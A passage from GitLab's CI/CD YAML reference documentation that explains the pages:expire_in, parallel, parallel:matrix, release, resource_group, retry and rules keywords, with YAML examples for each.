Use `expire_in` to specify how long a deployment should be available before
it expires. After the deployment is expired, it’s deactivated by a cron
job running every 10 minutes.

By default, [parallel deployments](https://docs.gitlab.com/user/project/pages/#parallel-deployments) expire
automatically after 24 hours.
To disable this behavior, set the value to `never`.

**Keyword type**: Job keyword. You can use it only as part of a `pages` job.

**Supported values**: The expiry time. If no unit is provided, the time is in seconds.
Variables are also supported. Valid values include:

- `'42'`
- `42 seconds`
- `3 mins 4 sec`
- `2 hrs 20 min`
- `2h20min`
- `6 mos 1 day`
- `47 yrs 6 mos and 4d`
- `3 weeks and 2 days`
- `never`
- `$DURATION`

**Example of `pages.expire_in`**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - echo "Pages accessible through ${CI_PAGES_URL}"
pages:  # specifies that this is a Pages job and publishes the default public directory
    expire_in: 1 week
```

### `parallel` [Permalink](https://docs.gitlab.com/ci/yaml/\#parallel "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/336576) in GitLab 15.9, the maximum value for `parallel` is increased from 50 to 200.

Use `parallel` to run a job multiple times in parallel in a single pipeline.

Multiple runners must exist, or a single runner must be configured to run multiple jobs concurrently.

Parallel jobs are named sequentially from `job_name 1/N` to `job_name N/N`.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A numeric value from `1` to `200`.

**Example of `parallel`**:

YAML Copy to clipboard

```yaml
test:
script: rspec
parallel: 5
```

This example creates 5 jobs that run in parallel, named `test 1/5` to `test 5/5`.

**Additional details**:

- Every parallel job has a `CI_NODE_INDEX` and `CI_NODE_TOTAL` [predefined CI/CD variable](https://docs.gitlab.com/ci/variables/#predefined-cicd-variables) set.
- A pipeline with jobs that use `parallel` might:
  - Create more jobs running in parallel than available runners. Excess jobs are queued
    and marked `pending` while waiting for an available runner.
  - Create too many jobs, and the pipeline fails with a `job_activity_limit_exceeded` error.
    The maximum number of jobs that can exist in active pipelines is [limited at the instance-level](https://docs.gitlab.com/administration/instance_limits/#number-of-jobs-in-active-pipelines).

**Related topics**:

- [Parallelize large jobs](https://docs.gitlab.com/ci/jobs/job_control/#parallelize-large-jobs).

#### `parallel:matrix` [Permalink](https://docs.gitlab.com/ci/yaml/\#parallelmatrix "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/336576) in GitLab 15.9, the maximum number of permutations is increased from 50 to 200.

Use `parallel:matrix` to run a job multiple times in parallel in a single pipeline,
but with different variable values for each instance of the job.

Multiple runners must exist, or a single runner must be configured to run multiple jobs concurrently.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: An array of hashes of variables:

- The variable names can use only numbers, letters, and underscores ( `_`).
- The values must be either a string, or an array of strings.
- The number of permutations cannot exceed 200.

**Example of `parallel:matrix`**:

YAML Copy to clipboard

```yaml
deploystacks:
stage: deploy
script:
    - bin/deploy
parallel:
    matrix:
      - PROVIDER: aws
        STACK:
          - monitoring
          - app1
          - app2
      - PROVIDER: ovh
        STACK: [monitoring, backup, app]
      - PROVIDER: [gcp, vultr]
        STACK: [data, processing]
environment: $PROVIDER/$STACK
```

The example generates 10 parallel `deploystacks` jobs, each with different values
for `PROVIDER` and `STACK`:

Copy to clipboard

```plaintext
deploystacks: [aws, monitoring]
deploystacks: [aws, app1]
deploystacks: [aws, app2]
deploystacks: [ovh, monitoring]
deploystacks: [ovh, backup]
deploystacks: [ovh, app]
deploystacks: [gcp, data]
deploystacks: [gcp, processing]
deploystacks: [vultr, data]
deploystacks: [vultr, processing]
```

**Additional details**:

- `parallel:matrix` jobs add the variable values to the job names to differentiate
the jobs from each other, but [large values can cause names to exceed limits](https://gitlab.com/gitlab-org/gitlab/-/issues/362262):

  - [Job names](https://docs.gitlab.com/ci/jobs/#job-names) must be 255 characters or fewer.
  - When using [`needs`](https://docs.gitlab.com/ci/yaml/#needs), job names must be 128 characters or fewer.
- You cannot create multiple matrix configurations with the same variable values but different variable names.
Job names are generated from the variable values, not the variable names, so matrix entries
with identical values generate identical job names that overwrite each other.

For example, this `test` configuration would try to create two series of identical jobs,
but the `OS2` versions overwrite the `OS` versions:



YAML Copy to clipboard





```yaml
test:
    parallel:
      matrix:
      - OS: [ubuntu]
        PROVIDER: [aws, gcp]
      - OS2: [ubuntu]
        PROVIDER: [aws, gcp]
```

  - There’s a [known issue](https://docs.gitlab.com/ci/debugging/#config-should-be-an-array-of-hashes-error-message) when using [`!reference` tags](https://docs.gitlab.com/ci/yaml/yaml_optimization/#reference-tags) with `parallel:matrix`.

**Related topics**:

- [Run a one-dimensional matrix of parallel jobs](https://docs.gitlab.com/ci/jobs/job_control/#run-a-one-dimensional-matrix-of-parallel-jobs).
- [Run a matrix of triggered parallel jobs](https://docs.gitlab.com/ci/jobs/job_control/#run-a-matrix-of-parallel-trigger-jobs).
- [Select different runner tags for each parallel matrix job](https://docs.gitlab.com/ci/jobs/job_control/#select-different-runner-tags-for-each-parallel-matrix-job).

### `release` [Permalink](https://docs.gitlab.com/ci/yaml/\#release "Permalink")

Use `release` to create a [release](https://docs.gitlab.com/user/project/releases/).

The release job must have access to the [`release-cli`](https://gitlab.com/gitlab-org/release-cli/-/tree/master/docs),
which must be in the `$PATH`.

If you use the [Docker executor](https://docs.gitlab.com/runner/executors/docker.html),
you can use this image from the GitLab container registry: `registry.gitlab.com/gitlab-org/release-cli:latest`

If you use the [Shell executor](https://docs.gitlab.com/runner/executors/shell.html) or similar,
[install `release-cli`](https://docs.gitlab.com/user/project/releases/release_cli/) on the server where the runner is registered.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: The `release` subkeys:

- [`tag_name`](https://docs.gitlab.com/ci/yaml/#releasetag_name)
- [`tag_message`](https://docs.gitlab.com/ci/yaml/#releasetag_message) (optional)
- [`name`](https://docs.gitlab.com/ci/yaml/#releasename) (optional)
- [`description`](https://docs.gitlab.com/ci/yaml/#releasedescription)
- [`ref`](https://docs.gitlab.com/ci/yaml/#releaseref) (optional)
- [`milestones`](https://docs.gitlab.com/ci/yaml/#releasemilestones) (optional)
- [`released_at`](https://docs.gitlab.com/ci/yaml/#releasereleased_at) (optional)
- [`assets:links`](https://docs.gitlab.com/ci/yaml/#releaseassetslinks) (optional)

**Example of `release` keyword**:

YAML Copy to clipboard

```yaml
release_job:
stage: release
image: registry.gitlab.com/gitlab-org/release-cli:latest
rules:
    - if: $CI_COMMIT_TAG                  # Run this job when a tag is created manually
script:
    - echo "Running the release job."
release:
    tag_name: $CI_COMMIT_TAG
    name: 'Release $CI_COMMIT_TAG'
    description: 'Release created using the release-cli.'
```

This example creates a release:

- When you push a Git tag.
- When you add a Git tag in the UI at **Code > Tags**.

**Additional details**:

- All release jobs, except [trigger](https://docs.gitlab.com/ci/yaml/#trigger) jobs, must include the `script` keyword. A release
job can use the output from script commands. If you don’t need the script, you can use a placeholder:



YAML Copy to clipboard





```yaml
script:
  - echo "release job"
```

An [issue](https://gitlab.com/gitlab-org/gitlab/-/issues/223856) exists to remove this requirement.

- The `release` section executes after the `script` keyword and before the `after_script`.

- A release is created only if the job’s main script succeeds.

- If the release already exists, it is not updated and the job with the `release` keyword fails.


**Related topics**:

- [CI/CD example of the `release` keyword](https://docs.gitlab.com/user/project/releases/#creating-a-release-by-using-a-cicd-job).
- [Create multiple releases in a single pipeline](https://docs.gitlab.com/user/project/releases/#create-multiple-releases-in-a-single-pipeline).
- [Use a custom SSL CA certificate authority](https://docs.gitlab.com/user/project/releases/#use-a-custom-ssl-ca-certificate-authority).

#### `release:tag_name` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasetag_name "Permalink")

Required. The Git tag for the release.

If the tag does not exist in the project yet, it is created at the same time as the release.
New tags use the SHA associated with the pipeline.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A tag name.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `release:tag_name`**:

To create a release when a new tag is added to the project:

- Use the `$CI_COMMIT_TAG` CI/CD variable as the `tag_name`.
- Use [`rules:if`](https://docs.gitlab.com/ci/yaml/#rulesif) to configure the job to run only for new tags.

YAML Copy to clipboard

```yaml
job:
script: echo "Running the release job for the new tag."
release:
    tag_name: $CI_COMMIT_TAG
    description: 'Release description'
rules:
    - if: $CI_COMMIT_TAG
```

To create a release and a new tag at the same time, your [`rules`](https://docs.gitlab.com/ci/yaml/#rules)
should **not** configure the job to run only for new tags. A semantic versioning example:

YAML Copy to clipboard

```yaml
job:
script: echo "Running the release job and creating a new tag."
release:
    tag_name: ${MAJOR}_${MINOR}_${REVISION}
    description: 'Release description'
rules:
    - if: $CI_PIPELINE_SOURCE == "schedule"
```

#### `release:tag_message` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasetag_message "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/363024) in GitLab 15.3. Supported by `release-cli` v0.12.0 or later.

If the tag does not exist, the newly created tag is annotated with the message specified by `tag_message`.
If omitted, a lightweight tag is created.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A text string.

**Example of `release:tag_message`**:

YAML Copy to clipboard

```yaml
release_job:
    stage: release
    release:
      tag_name: $CI_COMMIT_TAG
      description: 'Release description'
      tag_message: 'Annotated tag message'
```

#### `release:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasename "Permalink")

The release name. If omitted, it is populated with the value of `release: tag_name`.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A text string.

**Example of `release:name`**:

YAML Copy to clipboard

```yaml
release_job:
    stage: release
    release:
      name: 'Release $CI_COMMIT_TAG'
```

#### `release:description` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasedescription "Permalink")

The long description of the release.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A string with the long description.
- The path to a file that contains the description.
  - The file location must be relative to the project directory ( `$CI_PROJECT_DIR`).
  - If the file is a symbolic link, it must be in the `$CI_PROJECT_DIR`.
  - The `./path/to/file` and filename can’t contain spaces.

**Example of `release:description`**:

YAML Copy to clipboard

```yaml
job:
release:
    tag_name: ${MAJOR}_${MINOR}_${REVISION}
    description: './path/to/CHANGELOG.md'
```

**Additional details**:

- The `description` is evaluated by the shell that runs `release-cli`.
You can use CI/CD variables to define the description, but some shells
[use different syntax](https://docs.gitlab.com/ci/variables/job_scripts/)
to reference variables. Similarly, some shells might require special characters
to be escaped. For example, backticks ( `` ` ``) might need to be escaped with a backslash ( `\`).

#### `release:ref` [Permalink](https://docs.gitlab.com/ci/yaml/\#releaseref "Permalink")

The `ref` for the release, if the `release: tag_name` doesn’t exist yet.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A commit SHA, another tag name, or a branch name.

#### `release:milestones` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasemilestones "Permalink")

The title of each milestone the release is associated with.

#### `release:released_at` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasereleased_at "Permalink")

The date and time when the release is ready.

**Supported values**:

- A date enclosed in quotes and expressed in ISO 8601 format.

**Example of `release:released_at`**:

YAML Copy to clipboard

```yaml
released_at: '2021-03-15T08:00:00Z'
```

**Additional details**:

- If it is not defined, the current date and time is used.

#### `release:assets:links` [Permalink](https://docs.gitlab.com/ci/yaml/\#releaseassetslinks "Permalink")

Use `release:assets:links` to include [asset links](https://docs.gitlab.com/user/project/releases/release_fields/#release-assets) in the release.

Requires `release-cli` version v0.4.0 or later.

**Example of `release:assets:links`**:

YAML Copy to clipboard

```yaml
assets:
links:
    - name: 'asset1'
      url: 'https://example.com/assets/1'
    - name: 'asset2'
      url: 'https://example.com/assets/2'
      filepath: '/pretty/url/1' # optional
      link_type: 'other' # optional
```

### `resource_group` [Permalink](https://docs.gitlab.com/ci/yaml/\#resource_group "Permalink")

Use `resource_group` to create a [resource group](https://docs.gitlab.com/ci/resource_groups/) that
ensures a job is mutually exclusive across different pipelines for the same project.

For example, if multiple jobs that belong to the same resource group are queued simultaneously,
only one of the jobs starts. The other jobs wait until the `resource_group` is free.

Resource groups behave similar to semaphores in other programming languages.

You can choose a [process mode](https://docs.gitlab.com/ci/resource_groups/#process-modes) to strategically control the job concurrency for your deployment preferences. The default process mode is `unordered`. To change the process mode of a resource group, use the [API](https://docs.gitlab.com/api/resource_groups/#edit-an-existing-resource-group) to send a request to edit an existing resource group.

You can define multiple resource groups per environment. For example,
when deploying to physical devices, you might have multiple physical devices. Each device
can be deployed to, but only one deployment can occur per device at any given time.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- Only letters, digits, `-`, `_`, `/`, `$`, `{`, `}`, `.`, and spaces.
It can’t start or end with `/`. CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `resource_group`**:

YAML Copy to clipboard

```yaml
deploy-to-production:
script: deploy
resource_group: production
```

In this example, two `deploy-to-production` jobs in two separate pipelines can never run at the same time. As a result,
you can ensure that concurrent deployments never happen to the production environment.

**Related topics**:

- [Pipeline-level concurrency control with cross-project/parent-child pipelines](https://docs.gitlab.com/ci/resource_groups/#pipeline-level-concurrency-control-with-cross-projectparent-child-pipelines).

### `retry` [Permalink](https://docs.gitlab.com/ci/yaml/\#retry "Permalink")

Use `retry` to configure how many times a job is retried if it fails.
If not defined, defaults to `0` and jobs do not retry.

When a job fails, the job is processed up to two more times, until it succeeds or
reaches the maximum number of retries.

By default, all failure types cause the job to be retried. Use [`retry:when`](https://docs.gitlab.com/ci/yaml/#retrywhen) or [`retry:exit_codes`](https://docs.gitlab.com/ci/yaml/#retryexit_codes)
to select which failures to retry on.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `0` (default), `1`, or `2`.

**Example of `retry`**:

YAML Copy to clipboard

```yaml
test:
script: rspec
retry: 2

test_advanced:
script:
    - echo "Run a script that results in exit code 137."
    - exit 137
retry:
    max: 2
    when: runner_system_failure
    exit_codes: 137
```

`test_advanced` will be retried up to 2 times if the exit code is `137` or if it had
a runner system failure.

#### `retry:when` [Permalink](https://docs.gitlab.com/ci/yaml/\#retrywhen "Permalink")

Use `retry:when` with `retry:max` to retry jobs for only specific failure cases.
`retry:max` is the maximum number of retries, like [`retry`](https://docs.gitlab.com/ci/yaml/#retry), and can be
`0`, `1`, or `2`.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A single failure type, or an array of one or more failure types:

- `always`: Retry on any failure (default).
- `unknown_failure`: Retry when the failure reason is unknown.
- `script_failure`: Retry when:
  - The script failed.
  - The runner failed to pull the Docker image. For `docker`, `docker+machine`, `kubernetes` [executors](https://docs.gitlab.com/runner/executors/).
- `api_failure`: Retry on API failure.
- `stuck_or_timeout_failure`: Retry when the job got stuck or timed out.
- `runner_system_failure`: Retry if there is a runner system failure (for example, job setup failed).
- `runner_unsupported`: Retry if the runner is unsupported.
- `stale_schedule`: Retry if a delayed job could not be executed.
- `job_execution_timeout`: Retry if the script exceeded the maximum execution time set for the job.
- `archived_failure`: Retry if the job is archived and can’t be run.
- `unmet_prerequisites`: Retry if the job failed to complete prerequisite tasks.
- `scheduler_failure`: Retry if the scheduler failed to assign the job to a runner.
- `data_integrity_failure`: Retry if there is an unknown job problem.

**Example of `retry:when`** (single failure type):

YAML Copy to clipboard

```yaml
test:
script: rspec
retry:
    max: 2
    when: runner_system_failure
```

If there is a failure other than a runner system failure, the job is not retried.

**Example of `retry:when`** (array of failure types):

YAML Copy to clipboard

```yaml
test:
script: rspec
retry:
    max: 2
    when:
      - runner_system_failure
      - stuck_or_timeout_failure
```

#### `retry:exit_codes` [Permalink](https://docs.gitlab.com/ci/yaml/\#retryexit_codes "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/430037) in GitLab 16.10 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_retry_on_exit_codes`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/430037) in GitLab 16.11.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/452412) in GitLab 17.5. Feature flag `ci_retry_on_exit_codes` removed.

Use `retry:exit_codes` with `retry:max` to retry jobs for only specific failure cases.
`retry:max` is the maximum number of retries, like [`retry`](https://docs.gitlab.com/ci/yaml/#retry), and can be
`0`, `1`, or `2`.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A single exit code.
- An array of exit codes.

**Example of `retry:exit_codes`**:

YAML Copy to clipboard

```yaml
test_job_1:
script:
    - echo "Run a script that results in exit code 1. This job isn't retried."
    - exit 1
retry:
    max: 2
    exit_codes: 137

test_job_2:
script:
    - echo "Run a script that results in exit code 137. This job will be retried."
    - exit 137
retry:
    max: 1
    exit_codes:
      - 255
      - 137
```

**Related topics**:

You can specify the number of [retry attempts for certain stages of job execution](https://docs.gitlab.com/ci/runners/configure_runners/#job-stages-attempts)
using variables.

### `rules` [Permalink](https://docs.gitlab.com/ci/yaml/\#rules "Permalink")

Use `rules` to include or exclude jobs in pipelines.

Rules are evaluated when the pipeline is created, and evaluated in order. When a match is found,
no more rules are checked and the job is either included or excluded from the pipeline
depending on the configuration. If no rules match, the job is not added to the pipeline.

`rules` accepts an array of rules. Each rules must have at least one of:

- `if`
- `changes`
- `exists`
- `when`

Rules can also optionally be combined with:

- `allow_failure`
- `needs`
- `variables`
- `interruptible`

You can combine multiple keywords together for [complex rules](https://docs.gitlab.com/ci/jobs/job_rules/#complex-rules).

The job is added to the pipeline:

- If an `if`, `changes`, or `exists` rule matches, and is configured with `when: on_success` (default if not defined),
`when: delayed`, or `when: always`.
- If a rule is reached that is only `when: on_success`, `when: delayed`, or `when: always`.

The job is not added to the pipeline:

- If no rules match.
- If a rule matches and has `when: never`.

For additional examples, see [Specify when jobs run with `rules`](https://docs.gitlab.com/ci/jobs/job_rules/).

#### `rules:if` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesif "Permalink")

Use `rules:if` clauses to specify when to add a job to a pipeline:

- If an `if` statement is true, add the job to the pipeline.
- If an `if` statement is true, but it’s combined with `when: never`, do not add the job to the pipeline.
- If an `if` statement is false, check the next `rules` item (if any more exist).

`if` clauses are evaluated:

- Based on the values of [CI/CD variables](https://docs.gitlab.com/ci/variables/) or [predefined CI/CD variables](https://docs.gitlab.com/ci/variables/predefined_variables/),
with [some exceptions](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- In order, following [`rules` execution flow](https://docs.gitlab.com/ci/yaml/#rules).

**Keyword type**: Job-specific and pipeline-specific. You can use it as part of a job
to configure the job behavior, or with [`workflow`](https://docs.gitlab.com/ci/yaml/#workflow) to configure the pipeline behavior.

**Supported values**:

- A [CI/CD variable expression](https://docs.gitlab.com/ci/jobs/job_rules/#cicd-variable-expressions).

**Example of `rules:if`**:

YAML Copy to clipboard

```yaml
job:
script: echo "Hello, Rules!"
rules:
    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/ && $CI_MERGE_REQUEST_TARGET_BRANCH_NAME != $CI_DEFAULT_BRANCH
      when: never
    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/
      when: manual
      allow_failure: true
    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME
```

**Additional details**:

- You cannot use [nested variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#nested-variable-expansion)
with `if`. See [issue 327780](https://gitlab.com/gitlab-org/gitlab/-/issues/327780) for more details.
- If a rule matches and has no `when` defined, the rule uses the `when`
defined for the job, which defaults to `on_success` if not defined.
- You can [mix `when` at the job-level with `when` in rules](https://gitlab.com/gitlab-org/gitlab/-/issues/219437).
`when` configuration in `rules` takes precedence over `when` at the job-level.
- Unlike variables in [`script`](https://docs.gitlab.com/ci/variables/job_scripts/)
sections, variables in rules expressions are always formatted as `$VARIABLE`.
  - You can use `rules:if` with `include` to [conditionally include other configuration files](https://docs.gitlab.com/ci/yaml/includes/#use-rules-with-include).
- CI/CD variables on the right side of `=~` and `!~` expressions are [evaluated as regular expressions](https://docs.gitlab.com/ci/jobs/job_rules/#store-a-regular-expression-in-a-variable).

**Related topics**:

- [Common `if` expressions for `rules`](https://docs.gitlab.com/ci/jobs/job_rules/#common-if-clauses-with-predefined-variables).
- [Avoid duplicate pipelines](https://docs.gitlab.com/ci/jobs/job_rules/#avoid-duplicate-pipelines).
- [Use `rules` to run merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#add-jobs-to-merge-request-pipelines).

#### `rules:changes` [Permalink](https://docs.gitlab.com/ci/yaml/\#ruleschanges "Permalink")

Use `rules:changes` to specify when to add a job to a pipeline by checking for changes
to specific files.

For new branch pipelines or when there is no Git `push` event, `rules: changes` always evaluates to true
and the job always runs. Pipelines like tag pipelines, scheduled pipelines,
and manual pipelines, all do **not** have a Git `push` event associated with them.
To cover these cases, use [`rules: changes: compare_to`](https://docs.gitlab.com/ci/yaml/#ruleschangescompare_to) to specify
the branch to compare against the pipeline ref.

If you do not use `compare_to`, you should use `rules: changes` only with [branch pipelines](https://docs.gitlab.com/ci/pipelines/pipeline_types/#branch-pipeline)
or [merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/), though
`rules: changes` still evaluates to true when creating a new branch. With:

- Merge request pipelines, `rules:changes` compares the changes with the target MR branch.
- Branch pipelines, `rules:changes` compares the changes with the previous commit on the branch.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

An array including any number of:

- Paths to files. The file paths can include [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- Wildcard paths for:
  - Single directories, for example `path/to/directory/*`.
  - A directory and all its subdirectories, for example `path/to/directory/**/*`.
- Wildcard [glob](https://en.wikipedia.org/wiki/Glob_%28programming%29) paths for all files
with the same extension or multiple extensions, for example `*.md` or `path/to/directory/*.{rb,py,sh}`.
- Wildcard paths to files in the root directory, or all directories, wrapped in double quotes.
For example `"*.json"` or `"**/*.json"`.

**Example of `rules:changes`**:

YAML Copy to clipboard

```yaml
docker build:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        - Dockerfile
      when: manual
      allow_failure: true

docker build alternative:
variables:
    DOCKERFILES_DIR: 'path/to/dockerfiles'
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        - $DOCKERFILES_DIR/**/*
```

In this example:

- If the pipeline is a merge request pipeline, check `Dockerfile` and the files in
`$DOCKERFILES_DIR/**/*` for changes.
- If `Dockerfile` has changed, add the job to the pipeline as a manual job, and the pipeline
continues running even if the job is not triggered ( `allow_failure: true`).
- If a file in `$DOCKERFILES_DIR/**/*` has changed, add the job to the pipeline.
- If no listed files have changed, do not add either job to any pipeline (same as `when: never`).

**Additional details**:

- Glob patterns are interpreted with Ruby’s [`File.fnmatch`](https://docs.ruby-lang.org/en/master/File.html#method-c-fnmatch)
with the [flags](https://docs.ruby-lang.org/en/master/File/Constants.html#module-File::Constants-label-Filename+Globbing+Constants+-28File-3A-3AFNM_-2A-29) `File::FNM_PATHNAME | File::FNM_DOTMATCH | File::FNM_EXTGLOB`.
- A maximum of 50 patterns or file paths can be defined per `rules:changes` section.
- `changes` resolves to `true` if any of the matching files are changed (an `OR` operation).
- For additional examples, see [Specify when jobs run with `rules`](https://docs.gitlab.com/ci/jobs/job_rules/).
- You can use the `$` character for both variables and paths. For example, if the
`$VAR` variable exists, its value is used. If it does not exist, the `$` is interpreted
as being part of a path.

**Related topics**:

- [Jobs or pipelines can run unexpectedly when using `rules: changes`](https://docs.gitlab.com/ci/jobs/job_troubleshooting/#jobs-or-pipelines-run-unexpectedly-when-using-changes).

##### `rules:changes:paths` [Permalink](https://docs.gitlab.com/ci/yaml/\#ruleschangespaths "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/90171) in GitLab 15.2.

Use `rules:changes` to specify that a job only be added to a pipeline when specific
files are changed, and use `rules:changes:paths` to specify the files.

`rules:changes:paths` is the same as using [`rules:changes`](https://docs.gitlab.com/ci/yaml/#ruleschanges) without
any subkeys. All additional details and related topics are the same.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- Same as `rules:changes`.

**Example of `rules:changes:paths`**:

YAML Copy to clipboard

```yaml
docker-build-1:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        - Dockerfile

docker-build-2:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        paths:
          - Dockerfile
```

In this example, both jobs have the same behavior.

##### `rules:changes:compare_to` [Permalink](https://docs.gitlab.com/ci/yaml/\#ruleschangescompare_to "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/293645) in GitLab 15.3 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_rules_changes_compare`. Enabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/366412) in GitLab 15.5. Feature flag `ci_rules_changes_compare` removed.
- Support for CI/CD variables [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/369916) in GitLab 17.2.

Use `rules:changes:compare_to` to specify which ref to compare against for changes to the files
listed under [`rules:changes:paths`](https://docs.gitlab.com/ci/yaml/#ruleschangespaths).

**Keyword type**: Job keyword. You can use it only as part of a job, and it must be combined with `rules:changes:paths`.

**Supported values**:

- A branch name, like `main`, `branch1`, or `refs/heads/branch1`.
- A tag name, like `tag1` or `refs/tags/tag1`.
- A commit SHA, like `2fg31ga14b`.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `rules:changes:compare_to`**:

YAML Copy to clipboard

```yaml
docker build:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        paths:
          - Dockerfile
        compare_to: 'refs/heads/branch1'
```

In this example, the `docker build` job is only included when the `Dockerfile` has changed
relative to `refs/heads/branch1` and the pipeline source is a merge request event.

**Additional details**:

- Using `compare_to` with [merged results pipelines](https://docs.gitlab.com/ci/pipelines/merged_results_pipelines/#troubleshooting) can cause unexpected results, because the comparison base is an internal commit that GitLab creates.

**Related topics**:

- You can use `rules:changes:compare_to` to [skip a job if the branch is empty](https://docs.gitlab.com/ci/jobs/job_rules/#skip-jobs-if-the-branch-is-empty).

#### `rules:exists` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesexists "Permalink")

History

- CI/CD variable support [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/283881) in GitLab 15.6.
- Maximum number of checks against `exists` patterns or file paths [increased](https://gitlab.com/gitlab-org/gitlab/-/issues/227632) from 10,000 to 50,000 in GitLab 17.7.
- Support for directory paths [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/327485) in GitLab 18.2.

Use `exists` to run a job when certain files or directories exist in the repository.

**Keyword type**: Job keyword. You can use it as part of a job or an [`include`](https://docs.gitlab.com/ci/yaml/#include).

**Supported values**:

- An array of file or directory paths. Paths are relative to the project directory ( `$CI_PROJECT_DIR`)
and can’t directly link outside it. File paths can use glob patterns and
[CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `rules:exists`**:

YAML Copy to clipboard

```yaml
job:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - exists:
        - Dockerfile

job2:
variables:
    DOCKERPATH: "**/Dockerfile"
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - exists:
        - $DOCKERPATH
```

In this example:

- `job1` runs if a `Dockerfile` exists in the root directory of the repository.
- `job2` runs if a `Dockerfile` exists anywhere in the repository.

**Additional details**:

- Glob patterns are interpreted with Ruby’s [`File.fnmatch`](https://docs.ruby-lang.org/en/master/File.html#method-c-fnmatch)
with the [flags](https://docs.ruby-lang.org/en/master/File/Constants.html#module-File::Constants-label-Filename+Globbing+Constants+-28File-3A-3AFNM_-2A-29) `File::FNM_PATHNAME | File::FNM_DOTMATCH | File::FNM_EXTGLOB`.
- For performance reasons, GitLab performs a maximum of 50,000 checks against
`exists` patterns or file paths. After the 50,000th check, rules with patterned
globs always match. In other words, the `exists` rule always assumes a match in
projects with more than 50,000 files, or if there are fewer than 50,000 files but
the `exists` rules are checked more than 50,000 times.  - If there are multiple patterned globs, the limit is 50,000 divided by the number
      of globs. For example, a rule with 5 patterned globs has file limit of 10,000.
- A maximum of 50 patterns or file paths can be defined per `rules:exists` section.
- `exists` resolves to `true` if any of the listed files are found (an `OR` operation).
- With job-level `rules:exists`, GitLab searches for the files in the project and
ref that runs the pipeline. When using [`include` with `rules:exists`](https://docs.gitlab.com/ci/yaml/includes/#include-with-rulesexists),
GitLab searches for the files or directories in the project and ref of the file that contains the `include`
section. The project containing the `include` section can be different than the project
running the pipeline when using:
  - [Nested includes](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes).
  - [Compliance pipelines](https://docs.gitlab.com/user/compliance/compliance_pipelines/).
- `rules:exists` cannot search for the presence of [artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/),
